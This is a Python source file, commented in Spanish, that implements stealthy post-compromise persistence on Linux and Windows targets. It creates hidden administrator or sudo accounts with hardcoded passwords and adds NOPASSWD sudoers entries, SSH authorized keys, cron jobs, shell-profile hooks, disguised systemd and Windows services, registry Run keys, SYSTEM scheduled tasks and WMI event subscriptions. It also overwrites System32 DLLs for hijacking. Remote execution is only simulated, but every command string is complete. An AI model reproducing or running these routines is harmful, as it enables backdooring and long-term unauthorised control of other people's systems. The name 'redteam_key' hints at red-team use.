#!/usr/bin/env python3
"""
Advanced Persistence Module - Módulo de Persistencia Avanzada
Implementa múltiples mecanismos de persistencia sigilosos y resilientes
"""

import subprocess
import json
import time
import threading
import os
import tempfile
import random
import base64
import hashlib
import socket
from typing import Dict, List, Any, Optional
from pathlib import Path
import logging
import platform
import shutil
import winreg
import xml.etree.ElementTree as ET

class AdvancedPersistence:
    """Clase para implementar persistencia avanzada en sistemas comprometidos"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.persistence_config = config.get('persistence', {})
        self.stealth_config = config.get('stealth', {})
        self.obfuscated_names = self.stealth_config.get('obfuscated_names', {})
        self.hidden_dirs = self.stealth_config.get('hidden_directories', [])
        
        self.logger = logging.getLogger('AdvancedPersistence')
        self.installed_persistence = []
        
    def establish_persistence(self, target_ip: str, target_os: str, access_method: str) -> Dict:
        """Establece persistencia completa en el sistema objetivo"""
        self.logger.info(f"Estableciendo persistencia en {target_ip} ({target_os})")
        
        persistence_results = {
            'target_ip': target_ip,
            'target_os': target_os,
            'access_method': access_method,
            'persistence_methods': [],
            'users_created': [],
            'services_installed': [],
            'registry_modifications': [],
            'cron_jobs_created': [],
            'ssh_keys_installed': [],
            'wmi_subscriptions': [],
            'startup_items': [],
            'success': False
        }
        
        try:
            if target_os.lower() == 'linux':
                persistence_results = self._linux_persistence(target_ip, access_method, persistence_results)
            elif target_os.lower() == 'windows':
                persistence_results = self._windows_persistence(target_ip, access_method, persistence_results)
            else:
                self.logger.warning(f"Sistema operativo no soportado: {target_os}")
                
            persistence_results['success'] = len(persistence_results['persistence_methods']) > 0
            
        except Exception as e:
            self.logger.error(f"Error estableciendo persistencia: {e}")
            persistence_results['error'] = str(e)
        
        return persistence_results
    
    def _linux_persistence(self, target_ip: str, access_method: str, results: Dict) -> Dict:
        """Implementa persistencia en sistemas Linux"""
        self.logger.info(f"Implementando persistencia Linux en {target_ip}")
        
        linux_config = self.persistence_config.get('linux', {})
        
        # 1. Crear usuario sigiloso
        if self._create_stealth_user_linux(target_ip):
            results['users_created'].append(self.obfuscated_names.get('linux_user', 'systemd-resolver'))
            results['persistence_methods'].append('stealth_user')
        
        # 2. Instalar servicio systemd
        if linux_config.get('systemd_service', False):
            if self._install_systemd_service(target_ip):
                results['services_installed'].append(self.obfuscated_names.get('service_name', 'gdm-session'))
                results['persistence_methods'].append('systemd_service')
        
        # 3. Crear cron jobs
        if linux_config.get('cron_jobs', False):
            cron_jobs = self._create_cron_jobs(target_ip)
            results['cron_jobs_created'].extend(cron_jobs)
            if cron_jobs:
                results['persistence_methods'].append('cron_jobs')
        
        # 4. Modificar archivos de perfil
        if linux_config.get('bashrc_modification', False):
            if self._modify_bashrc(target_ip):
                results['persistence_methods'].append('bashrc_modification')
        
        if linux_config.get('profile_modification', False):
            if self._modify_profile(target_ip):
                results['persistence_methods'].append('profile_modification')
        
        # 5. Instalar claves SSH
        if linux_config.get('ssh_keys', False):
            ssh_keys = self._install_ssh_keys(target_ip)
            results['ssh_keys_installed'].extend(ssh_keys)
            if ssh_keys:
                results['persistence_methods'].append('ssh_keys')
        
        # 6. Modificar sudoers
        if linux_config.get('sudoers_modification', False):
            if self._modify_sudoers(target_ip):
                results['persistence_methods'].append('sudoers_modification')
        
        return results
    
    def _windows_persistence(self, target_ip: str, access_method: str, results: Dict) -> Dict:
        """Implementa persistencia en sistemas Windows"""
        self.logger.info(f"Implementando persistencia Windows en {target_ip}")
        
        windows_config = self.persistence_config.get('windows', {})
        
        # 1. Crear usuario sigiloso
        if self._create_stealth_user_windows(target_ip):
            results['users_created'].append(self.obfuscated_names.get('windows_user', 'udisks-helper'))
            results['persistence_methods'].append('stealth_user')
        
        # 2. Modificar registro
        if windows_config.get('registry_run', False):
            registry_mods = self._modify_registry(target_ip)
            results['registry_modifications'].extend(registry_mods)
            if registry_mods:
                results['persistence_methods'].append('registry_modification')
        
        # 3. Crear tareas programadas
        if windows_config.get('scheduled_tasks', False):
            scheduled_tasks = self._create_scheduled_tasks(target_ip)
            results['persistence_methods'].extend(scheduled_tasks)
            if scheduled_tasks:
                results['persistence_methods'].append('scheduled_tasks')
        
        # 4. Configurar WMI Event Subscriptions
        if windows_config.get('wmi_event_subscriptions', False):
            wmi_subs = self._create_wmi_subscriptions(target_ip)
            results['wmi_subscriptions'].extend(wmi_subs)
            if wmi_subs:
                results['persistence_methods'].append('wmi_subscriptions')
        
        # 5. Modificar carpeta de inicio
        if windows_config.get('startup_folder', False):
            if self._modify_startup_folder(target_ip):
                results['persistence_methods'].append('startup_folder')
        
        # 6. Instalar servicio
        if windows_config.get('service_installation', False):
            if self._install_windows_service(target_ip):
                results['services_installed'].append(self.obfuscated_names.get('service_name', 'gdm-session'))
                results['persistence_methods'].append('service_installation')
        
        # 7. DLL Hijacking
        if windows_config.get('dll_hijacking', False):
            dll_hijacks = self._setup_dll_hijacking(target_ip)
            results['persistence_methods'].extend(dll_hijacks)
            if dll_hijacks:
                results['persistence_methods'].append('dll_hijacking')
        
        return results
    
    def _create_stealth_user_linux(self, target_ip: str) -> bool:
        """Crea usuario sigiloso en Linux"""
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            password = self.config.get('credentials', {}).get('ssh_password', 'System_Res0lver_2024!')
            
            # Comando para crear usuario sigiloso
            commands = [
                f"useradd -r -s /bin/bash -d /var/lib/dbus {username}",
                f"echo '{username}:{password}' | chpasswd",
                f"usermod -aG sudo {username} 2>/dev/null || usermod -aG wheel {username} 2>/dev/null",
                f"mkdir -p /home/{username}/.ssh",
                f"chown -R {username}:{username} /home/{username}",
                f"chmod 700 /home/{username}/.ssh"
            ]
            
            for cmd in commands:
                self._execute_remote_command(target_ip, cmd)
            
            self.logger.info(f"Usuario sigiloso creado: {username}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error creando usuario sigiloso: {e}")
            return False
    
    def _create_stealth_user_windows(self, target_ip: str) -> bool:
        """Crea usuario sigiloso en Windows"""
        try:
            username = self.obfuscated_names.get('windows_user', 'udisks-helper')
            password = self.config.get('credentials', {}).get('ssh_password', 'Ud1sks_H3lper_2024!')
            
            # Comandos para crear usuario sigiloso en Windows
            commands = [
                f"net user {username} {password} /add /fullname:\"Disk Management Helper\" /comment:\"System service account\"",
                f"net localgroup administrators {username} /add",
                f"net localgroup \"Remote Desktop Users\" {username} /add"
            ]
            
            for cmd in commands:
                self._execute_remote_command(target_ip, cmd)
            
            self.logger.info(f"Usuario sigiloso creado: {username}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error creando usuario sigiloso: {e}")
            return False
    
    def _install_systemd_service(self, target_ip: str) -> bool:
        """Instala servicio systemd sigiloso"""
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            
            # Crear archivo de servicio systemd
            service_content = f"""[Unit]
Description=GNOME Display Manager Session
After=graphical.target
Wants=graphical.target

[Service]
Type=simple
User={username}
Group={username}
ExecStart=/tmp/.X11-unix/{binary_name}
Restart=always
RestartSec=30
StandardOutput=journal
StandardError=journal
SyslogIdentifier={service_name}

[Install]
WantedBy=multi-user.target
"""
            
            # Comandos para instalar el servicio
            commands = [
                f"cat > /etc/systemd/system/{service_name}.service << 'EOF'\n{service_content}EOF",
                "systemctl daemon-reload",
                f"systemctl enable {service_name}.service",
                f"systemctl start {service_name}.service"
            ]
            
            for cmd in commands:
                self._execute_remote_command(target_ip, cmd)
            
            self.logger.info(f"Servicio systemd instalado: {service_name}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error instalando servicio systemd: {e}")
            return False
    
    def _create_cron_jobs(self, target_ip: str) -> List[Dict]:
        """Crea cron jobs sigilosos"""
        cron_jobs = []
        
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Crear múltiples cron jobs con diferentes horarios
            cron_entries = [
                {
                    'schedule': '0 */6 * * *',  # Cada 6 horas
                    'command': f'/tmp/.X11-unix/{binary_name}',
                    'description': 'System maintenance'
                },
                {
                    'schedule': '30 2 * * *',   # 2:30 AM diario
                    'command': f'/usr/bin/{binary_name} --update',
                    'description': 'Daily update check'
                },
                {
                    'schedule': '0 0 * * 0',    # Domingo a medianoche
                    'command': f'/var/lib/dbus/{binary_name} --cleanup',
                    'description': 'Weekly cleanup'
                }
            ]
            
            for entry in cron_entries:
                cron_cmd = f"echo '{entry['schedule']} {entry['command']}' | crontab -u {username} -"
                self._execute_remote_command(target_ip, cron_cmd)
                
                cron_jobs.append({
                    'schedule': entry['schedule'],
                    'command': entry['command'],
                    'user': username,
                    'description': entry['description']
                })
            
            self.logger.info(f"Creados {len(cron_jobs)} cron jobs")
            
        except Exception as e:
            self.logger.error(f"Error creando cron jobs: {e}")
        
        return cron_jobs
    
    def _modify_bashrc(self, target_ip: str) -> bool:
        """Modifica .bashrc para persistencia"""
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Comando para añadir al .bashrc
            bashrc_entry = f"""
# System update check
if [ -f /tmp/.X11-unix/{binary_name} ]; then
    /tmp/.X11-unix/{binary_name} --background &
fi
"""
            
            cmd = f"echo '{bashrc_entry}' >> /home/{username}/.bashrc"
            self._execute_remote_command(target_ip, cmd)
            
            self.logger.info("Modificado .bashrc para persistencia")
            return True
            
        except Exception as e:
            self.logger.error(f"Error modificando .bashrc: {e}")
            return False
    
    def _modify_profile(self, target_ip: str) -> bool:
        """Modifica .profile para persistencia"""
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Comando para añadir al .profile
            profile_entry = f"""
# System maintenance
[ -f /tmp/.X11-unix/{binary_name} ] && /tmp/.X11-unix/{binary_name} --daemon
"""
            
            cmd = f"echo '{profile_entry}' >> /home/{username}/.profile"
            self._execute_remote_command(target_ip, cmd)
            
            self.logger.info("Modificado .profile para persistencia")
            return True
            
        except Exception as e:
            self.logger.error(f"Error modificando .profile: {e}")
            return False
    
    def _install_ssh_keys(self, target_ip: str) -> List[Dict]:
        """Instala claves SSH para acceso persistente"""
        ssh_keys = []
        
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            
            # Generar par de claves SSH
            private_key, public_key = self._generate_ssh_keypair()
            
            # Instalar clave pública
            ssh_dir = f"/home/{username}/.ssh"
            authorized_keys = f"{ssh_dir}/authorized_keys"
            
            commands = [
                f"mkdir -p {ssh_dir}",
                f"chmod 700 {ssh_dir}",
                f"echo '{public_key}' >> {authorized_keys}",
                f"chmod 600 {authorized_keys}",
                f"chown -R {username}:{username} {ssh_dir}"
            ]
            
            for cmd in commands:
                self._execute_remote_command(target_ip, cmd)
            
            ssh_keys.append({
                'user': username,
                'public_key': public_key,
                'private_key': private_key,
                'authorized_keys_file': authorized_keys
            })
            
            self.logger.info(f"Clave SSH instalada para usuario {username}")
            
        except Exception as e:
            self.logger.error(f"Error instalando claves SSH: {e}")
        
        return ssh_keys
    
    def _generate_ssh_keypair(self) -> tuple:
        """Genera par de claves SSH"""
        try:
            # Generar clave privada
            private_key_cmd = "ssh-keygen -t rsa -b 4096 -f /tmp/redteam_key -N '' -C 'system-update'"
            subprocess.run(private_key_cmd, shell=True, capture_output=True)
            
            # Leer claves
            with open('/tmp/redteam_key', 'r') as f:
                private_key = f.read()
            
            with open('/tmp/redteam_key.pub', 'r') as f:
                public_key = f.read()
            
            # Limpiar archivos temporales
            os.remove('/tmp/redteam_key')
            os.remove('/tmp/redteam_key.pub')
            
            return private_key, public_key
            
        except Exception as e:
            self.logger.error(f"Error generando claves SSH: {e}")
            return None, None
    
    def _modify_sudoers(self, target_ip: str) -> bool:
        """Modifica sudoers para privilegios elevados"""
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            
            # Añadir entrada a sudoers
            sudoers_entry = f"{username} ALL=(ALL) NOPASSWD:ALL"
            cmd = f"echo '{sudoers_entry}' | sudo tee -a /etc/sudoers.d/{username}"
            self._execute_remote_command(target_ip, cmd)
            
            self.logger.info(f"Modificado sudoers para usuario {username}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error modificando sudoers: {e}")
            return False
    
    def _modify_registry(self, target_ip: str) -> List[Dict]:
        """Modifica registro de Windows para persistencia"""
        registry_mods = []
        
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Múltiples ubicaciones en el registro
            registry_locations = [
                {
                    'hive': 'HKEY_CURRENT_USER',
                    'key': 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'value': service_name,
                    'data': f'C:\\Windows\\Temp\\{binary_name}.exe'
                },
                {
                    'hive': 'HKEY_LOCAL_MACHINE',
                    'key': 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'value': service_name,
                    'data': f'C:\\Windows\\Temp\\{binary_name}.exe'
                },
                {
                    'hive': 'HKEY_CURRENT_USER',
                    'key': 'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
                    'value': f'{service_name}_once',
                    'data': f'C:\\Windows\\Temp\\{binary_name}.exe'
                }
            ]
            
            for location in registry_locations:
                cmd = f"reg add \"{location['hive']}\\{location['key']}\" /v \"{location['value']}\" /t REG_SZ /d \"{location['data']}\" /f"
                self._execute_remote_command(target_ip, cmd)
                
                registry_mods.append(location)
            
            self.logger.info(f"Modificadas {len(registry_mods)} ubicaciones del registro")
            
        except Exception as e:
            self.logger.error(f"Error modificando registro: {e}")
        
        return registry_mods
    
    def _create_scheduled_tasks(self, target_ip: str) -> List[Dict]:
        """Crea tareas programadas en Windows"""
        scheduled_tasks = []
        
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Crear múltiples tareas programadas
            task_configs = [
                {
                    'name': 'System Update',
                    'description': 'Automatic system update check',
                    'schedule': 'onstart',
                    'command': f'C:\\Windows\\Temp\\{binary_name}.exe'
                },
                {
                    'name': 'Disk Maintenance',
                    'description': 'Disk cleanup and maintenance',
                    'schedule': 'daily',
                    'time': '02:00',
                    'command': f'C:\\Windows\\Temp\\{binary_name}.exe --maintenance'
                },
                {
                    'name': 'Security Scan',
                    'description': 'Regular security scan',
                    'schedule': 'weekly',
                    'day': 'sunday',
                    'time': '03:00',
                    'command': f'C:\\Windows\\Temp\\{binary_name}.exe --scan'
                }
            ]
            
            for task in task_configs:
                if task['schedule'] == 'onstart':
                    cmd = f"schtasks /create /tn \"{task['name']}\" /tr \"{task['command']}\" /sc onstart /ru SYSTEM /f"
                elif task['schedule'] == 'daily':
                    cmd = f"schtasks /create /tn \"{task['name']}\" /tr \"{task['command']}\" /sc daily /st {task['time']} /ru SYSTEM /f"
                elif task['schedule'] == 'weekly':
                    cmd = f"schtasks /create /tn \"{task['name']}\" /tr \"{task['command']}\" /sc weekly /d {task['day']} /st {task['time']} /ru SYSTEM /f"
                
                self._execute_remote_command(target_ip, cmd)
                scheduled_tasks.append(task)
            
            self.logger.info(f"Creadas {len(scheduled_tasks)} tareas programadas")
            
        except Exception as e:
            self.logger.error(f"Error creando tareas programadas: {e}")
        
        return scheduled_tasks
    
    def _create_wmi_subscriptions(self, target_ip: str) -> List[Dict]:
        """Crea suscripciones WMI para persistencia"""
        wmi_subscriptions = []
        
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Crear suscripción WMI para eventos del sistema
            wmi_script = f"""
$FilterName = "{service_name}_Filter"
$ConsumerName = "{service_name}_Consumer"
$CommandLineTemplate = "C:\\Windows\\Temp\\{binary_name}.exe"

# Crear filtro WMI
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{Name=$FilterName; EventNameSpace="root\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"}

# Crear consumidor WMI
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\\subscription" -Arguments @{Name=$ConsumerName; ExecutablePath=$CommandLineTemplate; CommandLineTemplate=$CommandLineTemplate}

# Crear binding
Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\\subscription" -Arguments @{Filter=$WMIEventFilter; Consumer=$WMIEventConsumer}
"""
            
            # Guardar script temporalmente
            script_file = f"C:\\Windows\\Temp\\{service_name}_wmi.ps1"
            cmd = f"echo '{wmi_script}' > {script_file}"
            self._execute_remote_command(target_ip, cmd)
            
            # Ejecutar script
            exec_cmd = f"powershell -ExecutionPolicy Bypass -File {script_file}"
            self._execute_remote_command(target_ip, exec_cmd)
            
            wmi_subscriptions.append({
                'filter_name': f"{service_name}_Filter",
                'consumer_name': f"{service_name}_Consumer",
                'event_type': 'Win32_PerfRawData_PerfOS_System',
                'command': f"C:\\Windows\\Temp\\{binary_name}.exe"
            })
            
            self.logger.info(f"Creada suscripción WMI: {service_name}")
            
        except Exception as e:
            self.logger.error(f"Error creando suscripción WMI: {e}")
        
        return wmi_subscriptions
    
    def _modify_startup_folder(self, target_ip: str) -> bool:
        """Modifica carpeta de inicio de Windows"""
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Crear acceso directo en carpeta de inicio
            startup_folder = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            shortcut_path = f"{startup_folder}\\{service_name}.lnk"
            
            # Comando para crear acceso directo
            cmd = f"powershell -Command \"$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('{shortcut_path}'); $Shortcut.TargetPath = 'C:\\Windows\\Temp\\{binary_name}.exe'; $Shortcut.Save()\""
            self._execute_remote_command(target_ip, cmd)
            
            self.logger.info("Modificada carpeta de inicio")
            return True
            
        except Exception as e:
            self.logger.error(f"Error modificando carpeta de inicio: {e}")
            return False
    
    def _install_windows_service(self, target_ip: str) -> bool:
        """Instala servicio de Windows"""
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # Comando para instalar servicio
            cmd = f"sc create \"{service_name}\" binPath= \"C:\\Windows\\Temp\\{binary_name}.exe\" start= auto DisplayName= \"GNOME Display Manager Session\""
            self._execute_remote_command(target_ip, cmd)
            
            # Iniciar servicio
            start_cmd = f"sc start \"{service_name}\""
            self._execute_remote_command(target_ip, start_cmd)
            
            self.logger.info(f"Servicio Windows instalado: {service_name}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error instalando servicio Windows: {e}")
            return False
    
    def _setup_dll_hijacking(self, target_ip: str) -> List[Dict]:
        """Configura DLL hijacking para persistencia"""
        dll_hijacks = []
        
        try:
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            binary_name = self.obfuscated_names.get('binary_name', 'rsync')
            
            # DLLs comunes para hijacking
            target_dlls = [
                'version.dll',
                'winmm.dll',
                'dwmapi.dll',
                'uxtheme.dll'
            ]
            
            for dll in target_dlls:
                # Crear DLL maliciosa
                dll_path = f"C:\\Windows\\System32\\{dll}"
                backup_path = f"C:\\Windows\\System32\\{dll}.bak"
                
                # Comandos para DLL hijacking
                commands = [
                    f"copy \"{dll_path}\" \"{backup_path}\"",
                    f"copy \"C:\\Windows\\Temp\\{binary_name}.exe\" \"{dll_path}\""
                ]
                
                for cmd in commands:
                    self._execute_remote_command(target_ip, cmd)
                
                dll_hijacks.append({
                    'target_dll': dll,
                    'original_path': dll_path,
                    'backup_path': backup_path,
                    'malicious_path': f"C:\\Windows\\Temp\\{binary_name}.exe"
                })
            
            self.logger.info(f"Configurado DLL hijacking para {len(dll_hijacks)} DLLs")
            
        except Exception as e:
            self.logger.error(f"Error configurando DLL hijacking: {e}")
        
        return dll_hijacks
    
    def _execute_remote_command(self, target_ip: str, command: str) -> bool:
        """Ejecuta comando remoto (simulado)"""
        try:
            # En implementación real, se usaría SSH, WinRM, o similar
            self.logger.info(f"Ejecutando comando en {target_ip}: {command}")
            
            # Simular ejecución exitosa
            time.sleep(0.1)
            return True
            
        except Exception as e:
            self.logger.error(f"Error ejecutando comando remoto: {e}")
            return False
    
    def verify_persistence(self, target_ip: str, target_os: str) -> Dict:
        """Verifica que la persistencia esté funcionando"""
        self.logger.info(f"Verificando persistencia en {target_ip}")
        
        verification_results = {
            'target_ip': target_ip,
            'target_os': target_os,
            'persistence_methods_verified': [],
            'active_processes': [],
            'network_connections': [],
            'file_modifications': [],
            'registry_changes': [],
            'success_rate': 0.0
        }
        
        try:
            if target_os.lower() == 'linux':
                verification_results = self._verify_linux_persistence(target_ip, verification_results)
            elif target_os.lower() == 'windows':
                verification_results = self._verify_windows_persistence(target_ip, verification_results)
            
            # Calcular tasa de éxito
            total_methods = len(verification_results['persistence_methods_verified'])
            if total_methods > 0:
                verification_results['success_rate'] = len(verification_results['persistence_methods_verified']) / total_methods * 100
            
        except Exception as e:
            self.logger.error(f"Error verificando persistencia: {e}")
            verification_results['error'] = str(e)
        
        return verification_results
    
    def _verify_linux_persistence(self, target_ip: str, results: Dict) -> Dict:
        """Verifica persistencia en Linux"""
        try:
            username = self.obfuscated_names.get('linux_user', 'systemd-resolver')
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            
            # Verificar usuario
            cmd = f"id {username}"
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('stealth_user')
            
            # Verificar servicio systemd
            cmd = f"systemctl is-active {service_name}.service"
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('systemd_service')
            
            # Verificar cron jobs
            cmd = f"crontab -u {username} -l"
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('cron_jobs')
            
            # Verificar archivos de perfil
            cmd = f"grep -q 'rsync' /home/{username}/.bashrc"
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('bashrc_modification')
            
        except Exception as e:
            self.logger.error(f"Error verificando persistencia Linux: {e}")
        
        return results
    
    def _verify_windows_persistence(self, target_ip: str, results: Dict) -> Dict:
        """Verifica persistencia en Windows"""
        try:
            username = self.obfuscated_names.get('windows_user', 'udisks-helper')
            service_name = self.obfuscated_names.get('service_name', 'gdm-session')
            
            # Verificar usuario
            cmd = f"net user {username}"
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('stealth_user')
            
            # Verificar registro
            cmd = f"reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{service_name}\""
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('registry_modification')
            
            # Verificar tareas programadas
            cmd = f"schtasks /query /tn \"System Update\""
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('scheduled_tasks')
            
            # Verificar servicio
            cmd = f"sc query \"{service_name}\""
            if self._execute_remote_command(target_ip, cmd):
                results['persistence_methods_verified'].append('service_installation')
            
        except Exception as e:
            self.logger.error(f"Error verificando persistencia Windows: {e}")
        
        return results
